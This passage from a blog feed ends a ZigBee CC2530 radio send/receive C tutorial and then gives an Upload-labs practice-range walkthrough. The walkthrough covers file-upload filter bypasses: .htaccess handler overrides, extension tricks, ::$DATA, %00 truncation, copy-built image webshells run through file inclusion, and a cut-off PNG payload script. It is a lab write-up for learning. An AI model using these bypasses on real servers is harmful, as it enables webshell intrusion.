class="comment">//第一个字节0x0C含义，这个自己后面还有12个字节要发送</span></span><br><span class="line"><span class="comment">//第5 6个字节表示的是PANID</span></span><br><span class="line"><span class="comment">//第7 8个字节是无线模块目标设备的网络地址 0xBEEF</span></span><br><span class="line"><span class="comment">//第9 10就是本地模块的网络地址</span></span><br><span class="line"><span class="comment">//11 个字节是我们有用的数据</span></span><br><span class="line"><span class="comment">// CRC码 12 13个字节 是硬件自动追加</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delay</span><span class="params">()</span>  <span class="comment">//延时函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y,x;</span><br><span class="line">    <span class="keyword">for</span>(y=<span class="number">1000</span>;y&gt;<span class="number">0</span>;y--)</span><br><span class="line">      <span class="keyword">for</span>(x=<span class="number">30</span>;x&gt;<span class="number">0</span>;x--);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init32M</span><span class="params">()</span>  <span class="comment">//设置为32M晶振</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   SLEEPCMD &amp;=<span class="number">0xFB</span>;<span class="comment">//1111 1011 开启2个高频时钟源</span></span><br><span class="line">   <span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));<span class="comment">// 0100 0000 等待32M稳定</span></span><br><span class="line">   Delay();</span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0xF8</span>;<span class="comment">//1111 1000 不分频输出</span></span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0XBF</span>;<span class="comment">//1011 1111 设置32M作为系统主时钟</span></span><br><span class="line">   <span class="keyword">while</span>(CLKCONSTA &amp; <span class="number">0x40</span>); <span class="comment">//0100 0000 等待32M成功成为当前系统主时钟</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">KeysIntCfg</span><span class="params">()</span>  <span class="comment">//设置开关中断</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//Key3  Key4   Key5</span></span><br><span class="line">     </span><br><span class="line">     IEN2|=<span class="number">0x10</span>;<span class="comment">//开P1IE组中断</span></span><br><span class="line">     P1IEN|=<span class="number">0x02</span>;<span class="comment">//开Key3组内中断</span></span><br><span class="line">     PICTL|=<span class="number">0x02</span>;<span class="comment">//设置P1_1为下降沿 </span></span><br><span class="line">     EA=<span class="number">1</span>;      <span class="comment">//开总中断</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">halRfInit</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">//无线通信的初始化  初始化相关的寄存器，配置工作信道，和PANID</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    FRMCTRL0 |= <span class="number">0x60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Recommended RX settings  </span></span><br><span class="line">    TXFILTCFG = <span class="number">0x09</span>;</span><br><span class="line">    AGCCTRL1 = <span class="number">0x15</span>;</span><br><span class="line">    FSCAL1 = <span class="number">0x00</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// enable RXPKTDONE interrupt  </span></span><br><span class="line">    RFIRQM0 |= <span class="number">0x40</span>;<span class="comment">//把射频接收中断打开</span></span><br><span class="line">    <span class="comment">// enable general RF interrupts</span></span><br><span class="line">    IEN2 |= <span class="number">0x01</span>;</span><br><span class="line">    </span><br><span class="line">    FREQCTRL =(<span class="number">11</span>+(<span class="number">25</span><span class="number">-11</span>)*<span class="number">5</span>);<span class="comment">//(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);   </span></span><br><span class="line">                     <span class="comment">//设置载波为2475M</span></span><br><span class="line">    PAN_ID0=<span class="number">0x07</span>;</span><br><span class="line">    PAN_ID1=<span class="number">0x20</span>; <span class="comment">//0x2007   </span></span><br><span class="line"><span class="comment">//halRfRxInterruptConfig(basicRfRxFrmDoneIsr);    </span></span><br><span class="line">    RFST = <span class="number">0xEC</span>;<span class="comment">//清接收缓冲器</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>;<span class="comment">//开启接收使能 </span></span><br><span class="line">    EA=<span class="number">1</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RFSend</span><span class="params">(<span class="keyword">char</span> *pstr,<span class="keyword">char</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> i;</span><br><span class="line">    RFST = <span class="number">0xEC</span>; <span class="comment">//确保接收是空的</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>; <span class="comment">//清接收标志位</span></span><br><span class="line">    <span class="keyword">while</span> (FSMSTAT1 &amp; <span class="number">0x22</span>);<span class="comment">//等待射频发送准备好</span></span><br><span class="line">    RFST = <span class="number">0xEE</span>;<span class="comment">//确保发送队列是空</span></span><br><span class="line">    RFIRQF1 &amp;= ~<span class="number">0x02</span>;<span class="comment">//清发送标志位</span></span><br><span class="line"><span class="comment">//为数据发送做好准备工作</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">       RFD=pstr[i];</span><br><span class="line">    &#125;  <span class="comment">//循环的作用是把我们要发送的数据全部压到发送缓冲区里面</span></span><br><span class="line">    </span><br><span class="line">    RFST = <span class="number">0xE9</span>; <span class="comment">//这个寄存器一旦被设置为0xE9,发送缓冲区的数据就被发送出去</span></span><br><span class="line">    <span class="keyword">while</span>(!(RFIRQF1 &amp; <span class="number">0x02</span>) );<span class="comment">//等待发送完成</span></span><br><span class="line">    RFIRQF1 = ~<span class="number">0x02</span>;<span class="comment">//清发送完成标志</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   LS164_Cfg();<span class="comment">//74LS164控制数码管的初始化</span></span><br><span class="line">   Init32M(); <span class="comment">//主时钟晶振工作在32M </span></span><br><span class="line">   KeysIntCfg(); </span><br><span class="line">   </span><br><span class="line">   halRfInit();<span class="comment">//无线通信的初始化  初始化相关的寄存器，配置工作信道，和PANID</span></span><br><span class="line">   </span><br><span class="line">  SHORT_ADDR0=<span class="number">0x50</span>;</span><br><span class="line">  SHORT_ADDR1=<span class="number">0x20</span>;<span class="comment">//设置本模块地址  设置本模块的网络地址0x2050</span></span><br><span class="line">  <span class="comment">//大小端模式问题，</span></span><br><span class="line">  </span><br><span class="line">    LS164_BYTE(<span class="number">1</span>); </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=P1INT_VECTOR</span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">Key3_ISR</span><span class="params">()</span> <span class="comment">//P1_1</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="number">0x02</span> &amp; P1IFG)</span><br><span class="line">     &#123;</span><br><span class="line">         Delay();</span><br><span class="line">         <span class="keyword">if</span>(<span class="number">0</span>==P1_1)</span><br><span class="line">         &#123;</span><br><span class="line">           P1DIR |=<span class="number">0X01</span>;</span><br><span class="line">           P1_0 ^=<span class="number">1</span>;</span><br><span class="line">           RFSend(SendPacket,<span class="number">11</span>);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     P1IFG=<span class="number">0</span>;</span><br><span class="line">     P1IF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=RF_VECTOR</span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">RF_IRQ</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//这个是射频中断函数，当小灯模块接收到开关模块发送来的数据时，小灯模块的CPU就会进入中断函数执行</span></span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( RFIRQF0 &amp; <span class="number">0x40</span> )</span><br><span class="line">    &#123;            </span><br><span class="line">        RFIRQF0&amp;= ~<span class="number">0x40</span>;   <span class="comment">// Clear RXPKTDONE interrupt</span></span><br><span class="line">    &#125;</span><br><span class="line">    S1CON= <span class="number">0</span>;   <span class="comment">// Clear general RF interrupt flag</span></span><br><span class="line">    RFST = <span class="number">0xEC</span>;<span class="comment">//清接收缓冲器</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>;<span class="comment">//开启接收使能 </span></span><br><span class="line">    EA=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ioCC2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y,x;</span><br><span class="line">    <span class="keyword">for</span>(y=<span class="number">1000</span>;y&gt;<span class="number">0</span>;y--)</span><br><span class="line">      <span class="keyword">for</span>(x=<span class="number">30</span>;x&gt;<span class="number">0</span>;x--);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init32M</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   SLEEPCMD &amp;=<span class="number">0xFB</span>;<span class="comment">//1111 1011 开启2个高频时钟源</span></span><br><span class="line">   <span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));<span class="comment">// 0100 0000 等待32M稳定</span></span><br><span class="line">   Delay();</span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0xF8</span>;<span class="comment">//1111 1000 不分频输出</span></span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0XBF</span>;<span class="comment">//1011 1111 设置32M作为系统主时钟</span></span><br><span class="line">   <span class="keyword">while</span>(CLKCONSTA &amp; <span class="number">0x40</span>); <span class="comment">//0100 0000 等待32M成功成为当前系统主时钟</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Uart0_Cfg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   PERCFG &amp;=<span class="number">0xFE</span>;<span class="comment">//把这个寄存器的第零位强行清零  1111 1110 </span></span><br><span class="line">   <span class="comment">//就是把串口0的脚位置配置在备用位置1 即P0_2  P0_3</span></span><br><span class="line">   </span><br><span class="line">   P0SEL  |=<span class="number">0x0C</span>;<span class="comment">//让P0_2  P0_3这两个脚工作在片上外设模式,而不是普通IO口       0000 1100</span></span><br><span class="line">   </span><br><span class="line">   U0CSR |=<span class="number">0xC0</span>;</span><br><span class="line">   U0UCR =<span class="number">0</span>; <span class="comment">//串口0 典型的串口配置  校验位 停止位之类的东西</span></span><br><span class="line">   </span><br><span class="line">   U0GCR =<span class="number">11</span>;</span><br><span class="line">   U0BAUD =<span class="number">216</span>;<span class="comment">//就是重官方数据手册中波特率表格中参照115200时的 配置值，前提是系统时钟在32M</span></span><br><span class="line">   </span><br><span class="line">   IEN0 |=<span class="number">0x04</span>; <span class="comment">//开接收数据的中断  0000 0100</span></span><br><span class="line">   EA=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Uart0SendByte</span><span class="params">(<span class="keyword">char</span> SendByte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    U0DBUF=SendByte;  <span class="comment">//把我们收到的数据通过串口再返回发出去</span></span><br><span class="line">    <span class="keyword">while</span>(UTX0IF==<span class="number">0</span>);</span><br><span class="line">    UTX0IF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">halRfInit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    FRMCTRL0 |= <span class="number">0x60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Recommended RX settings  </span></span><br><span class="line">    TXFILTCFG = <span class="number">0x09</span>;</span><br><span class="line">    AGCCTRL1 = <span class="number">0x15</span>;</span><br><span class="line">    FSCAL1 = <span class="number">0x00</span>;</span><br><span class="line">    <span class="comment">// enable RXPKTDONE interrupt  </span></span><br><span class="line">    RFIRQM0 |= <span class="number">0x40</span>;</span><br><span class="line">    <span class="comment">// enable general RF interrupts</span></span><br><span class="line">    IEN2 |= <span class="number">0x01</span>;</span><br><span class="line">    </span><br><span class="line">    FREQCTRL =(<span class="number">11</span>+(<span class="number">25</span><span class="number">-11</span>)*<span class="number">5</span>);<span class="comment">//(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);    </span></span><br><span class="line">    PAN_ID0=<span class="number">0x07</span>;</span><br><span class="line">    PAN_ID1=<span class="number">0x20</span>;    </span><br><span class="line"><span class="comment">//halRfRxInterruptConfig(basicRfRxFrmDoneIsr);    </span></span><br><span class="line">    RFST = <span class="number">0xEC</span>;<span class="comment">//清接收缓冲器</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>;<span class="comment">//开启接收使能 </span></span><br><span class="line">    EA=<span class="number">1</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   LS164_Cfg();<span class="comment">//74LS164控制数码管的初始化</span></span><br><span class="line">   Init32M(); <span class="comment">//主时钟晶振工作在32M </span></span><br><span class="line">   halRfInit();</span><br><span class="line">   Uart0_Cfg();</span><br><span class="line">   </span><br><span class="line">  SHORT_ADDR0=<span class="number">0xEF</span>;</span><br><span class="line">  SHORT_ADDR1=<span class="number">0xBE</span>;<span class="comment">//设置本模块地址  0xBEEF</span></span><br><span class="line">  </span><br><span class="line">    LS164_BYTE(<span class="number">2</span>); </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RevRFProc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">char</span> len;</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">char</span>  ch;</span><br><span class="line"></span><br><span class="line">    len=ch=<span class="number">0</span>;</span><br><span class="line">    RFIRQM0 &amp;= ~<span class="number">0x40</span>;</span><br><span class="line">    IEN2 &amp;= ~<span class="number">0x01</span>;</span><br><span class="line">    EA=<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    len=RFD;<span class="comment">//读第一个字节判断这一串数据后面有几个字节；</span></span><br><span class="line">    <span class="comment">//len=0x0C 12</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (len&gt;<span class="number">0</span>) </span><br><span class="line">    &#123;<span class="comment">//只要后面还有数据那么就把他都从接受缓冲区取出来</span></span><br><span class="line">        ch=RFD;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">3</span>==len)</span><br><span class="line">        &#123;<span class="comment">//如果倒数第三个字节等于7，那么我们把LED0取反</span></span><br><span class="line">           LS164_BYTE(ch);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        len--;</span><br><span class="line">     &#125;     </span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// enable RXPKTDONE interrupt</span></span><br><span class="line">    RFIRQM0 |= <span class="number">0x40</span>;</span><br><span class="line">    <span class="comment">// enable general RF interrupts</span></span><br><span class="line">    IEN2 |= <span class="number">0x01</span>;        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=RF_VECTOR</span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">RF_IRQ</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//这个是射频中断函数，当小灯模块接收到开关模块发送来的数据时，小灯模块的CPU就会进入中断函数执行</span></span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( RFIRQF0 &amp; <span class="number">0x40</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        RevRFProc();</span><br><span class="line">             </span><br><span class="line">        RFIRQF0&amp;= ~<span class="number">0x40</span>;   <span class="comment">// Clear RXPKTDONE interrupt</span></span><br><span class="line">    &#125;</span><br><span class="line">    S1CON= <span class="number">0</span>;                   <span class="comment">// Clear general RF interrupt flag</span></span><br><span class="line">    RFST = <span class="number">0xEC</span>;<span class="comment">//清接收缓冲器</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>;<span class="comment">//开启接收使能 </span></span><br><span class="line">    EA=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs靶场</title>
      <link href="/2020/02/09/Upload-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2020/02/09/Upload-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>前端验证，审查元素删除HTML中的onsubmit属性再上传即可</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209135410152.png" alt="image-20200209140030770" style="zoom:67%;" /><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>MIME验证抓包修改 <code>Content-Type</code> 为 <code>image/jpeg</code> 后Forward即可</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209140030770.png" alt="image-20200209140030770" style="zoom:67%;" /><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>黑名单绕过，上传<code>.phtml</code>后缀即可</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209142528892.png" alt="image-20200209142528892" style="zoom:67%;" /><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>黑名单过滤了大多数后缀，于是上传<code>.htaccess</code>文件，内容如下，再上传后缀为<code>.jpg</code>的图片马即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209143708503.png" alt="image-20200209143708503" style="zoom: 80%;" /><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>黑名单过滤的绝大多数后缀名，并未进行大小写转换，于是上传<code>.Php</code>后缀即可</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209143601016.png" alt="image-20200209143601016" style="zoom:80%;" /><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>黑名单绕过，抓包在后缀名最后加上一个空格即可上传绕过</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209144523248.png" alt="image-20200209144523248" style="zoom:67%;" /><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>没进行删除末尾的点的函数，抓包在后缀名后加上一个点即可</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209150015983.png" alt="image-20200209150015983" style="zoom:67%;" /><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>未过滤<code>::$DATA</code>，利用Windows解析特性，抓包在后缀名后面添加上<code>::$DATA</code>即可绕过</p><blockquote><p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p></blockquote><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209150631366.png" alt="image-20200209150631366" style="zoom: 80%;" /><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>此处文件路径拼接的是处理后的文件名，于是上传后缀为<code>php. .</code>的文件即可</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209151526576.png" alt="image-20200209151526576" style="zoom:67%;" /><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>函数将黑名单内的后缀名替换成空，这里双写后缀名<code>.pphphp</code>即可</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209152136501.png" alt="image-20200209152136501" style="zoom:67%;" /><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>白名单验证，提示上传路径可控，发现在上传一个文件之后就会get一个文件路径参数，于是利用%00截断，使得文件路径为upload/1.php%00(文件名)，后面的文件没就就没读取了，这样访问upload/1.php即可获得木马路径。</p><p>版本要求：</p><blockquote><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p><p>magic_quotes_gpc需要为OFF状态</p></blockquote><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209153504142.png" alt="image-20200209153504142" style="zoom:80%;" /><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>与上题不一样这题改用了POST方法，一样%00截断抓包改即可，php版本需要注意</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209154835184.png" alt="image-20200209154835184" style="zoom:67%;" /><p>另外对%00进行如下操作亦可</p><blockquote><p>因为是十六进制所以这种截断叫做是<code>0x00截断</code>，其实是<code>%00截断</code>最终被<code>url解码</code>还是会变成<code>0x00</code>的。在<code>url</code>中<code>%00</code>表示<code>ascll</code>码中的<code>0</code>，而<code>ascii</code>中<code>0</code>作为特殊字符保留，表示字符串结束，所以当<code>url</code>中出现<code>%00</code>时就会认为读取已结束。</p></blockquote><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209155244508.png" alt="image-20200209155244508" style="zoom:67%;" /><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>cmd到两个文件所在路径下用copy命令制作图片马</p><blockquote><p>png：copy 1.png/b + 1.php/a shell.png</p><p>jpg：copy 1.jpg/b + 1.php/a shell.jpg</p><p>jpg：copy 1.gif/b + 1.php/a shell.gif</p></blockquote><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209155619608.png" alt="image-20200209155619608" style="zoom:67%;" /><p>本题源码：</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209161158284.png" alt="image-20200209161158284" style="zoom:67%;" /><p>作者提供的文件包含漏洞页面源码</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209160243525.png" alt="image-20200209160243525" style="zoom:67%;" /><p>制作好后上传，在文件包含漏洞页面getfile参数进行读取解析即可 <code>?file=./upload/6420200209090636.png</code>（三种都一样）</p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>后台代码改了，用的getimagesize函数判断后缀，但是解题方法还是和上题一样</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209161244545.png" alt="image-20200209161244545" style="zoom:67%;" /><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>本题用了php_exif模块来判断文件类型，图片马一样可以绕过</p><blockquote><p>用于读取一个图像的第一个字节并检查其签名</p><p>如果发现了恰当的签名则返回一个对应的常量，否则返回false</p></blockquote><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209161658971.png" alt="image-20200209161658971" style="zoom:67%;" /><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>参考：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p><p>这题存在对图片的二次渲染</p><h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>源码：</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209172121141.png" alt="image-20200209172121141" style="zoom:67%;" /><p>将做好的GIF图片马上传上去，利用文件包含漏洞进行读取，发现图片中的php代码并没有被解析，并且图片进行了二次渲染重构，内容被改写，于是使用GIF图的处理方法，将图片内容保存下来，与上传前的图片马作比较，发现有一部分没有被重写（如下图），于是将一句话插入到这一部分内容中，保存，重新上传，成功解析</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209171705862.png" alt="image-20200209171705862" style="zoom:67%;" /><h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209202039079.png" alt="image-20200209202039079" style="zoom:67%;" /><h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><p>这里有国外大牛的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span 